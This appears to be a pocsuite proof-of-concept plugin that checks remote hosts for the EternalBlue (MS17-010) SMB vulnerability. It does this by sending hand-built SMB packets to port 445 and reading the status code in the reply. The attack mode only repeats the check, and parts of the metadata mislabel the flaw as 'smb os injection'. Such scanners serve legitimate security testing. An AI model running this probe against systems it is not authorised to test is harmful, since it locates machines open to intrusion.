#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
# 命令行
from pocsuite import pocsuite_cli
# 验证模块
from pocsuite import pocsuite_verify
# 攻击模块
from pocsuite import pocsuite_attack
# 控制台模式
from pocsuite import pocsuite_console
# requests
from pocsuite.api.request import req
import urllib
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip


# 基础基类
class SMBPOC(POCBase):
    vulID = '36'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-06-7'  # 漏洞公开的时间,不知道就写今天
    author = 'xiaohuihui1'  # PoC作者的大名
    createDate = '2018-06-7'  # 编写 PoC 的日期
    updateDate = '2018-06-7'  # PoC 更新的时间,默认和编写时间一样
    references = 'http://netsecurity.51cto.com/art/201705/539811.htm'  # 漏洞地址来源,0day不用写
    name = 'smb os injection'  # PoC 名称
    appPowerLink = 'https://www.microsoftstore.com.cn'  # 漏洞厂商主页地址
    appName = 'smb'  # 漏洞应用名称
    appVersion = 'all versions'  # 漏洞影响版本
    vulType = 'smb os injection'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        永恒之蓝
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重"  # 严重,高危,中危,低危

    # 指纹方法
    def _fingerprint(self):
        pass

    def _verify(self):
        # 调用指纹方法
        result={}
        output = Output(self)
        import socket
        import binascii
        vul_ip = self.url
        vul_ip = vul_ip[7:]
        print vul_ip


        negotiate_protocol_request = binascii.unhexlify(
        "00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
        session_setup_request = binascii.unhexlify(
        "00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((vul_ip, 445))
            s.send(negotiate_protocol_request)
            s.recv(1024)
            s.send(session_setup_request)
            data = s.recv(1024)
            user_id = data[32:34]
            tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(vul_ip)), user_id.encode('hex'), vul_ip.encode('hex'))
            s.send(binascii.unhexlify(tree_connect_andx_request))
            data = s.recv(1024)
            allid = data[28:36]
            payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % allid.encode('hex')
            s.send(binascii.unhexlify(payload))
            data = s.recv(1024)
            s.close()
            if "\x05\x02\x00\xc0" in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_ip
                result['VerifyInfo']['Payload'] = vul_ip
                
            s.close()
        except Exception as e:
            print e
        print '[+]36 poc done'
        return self.save_output(result)
    # 攻击模块
    def _attack(self):
        return self._verify()
        #pass

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register(SMBPOC)
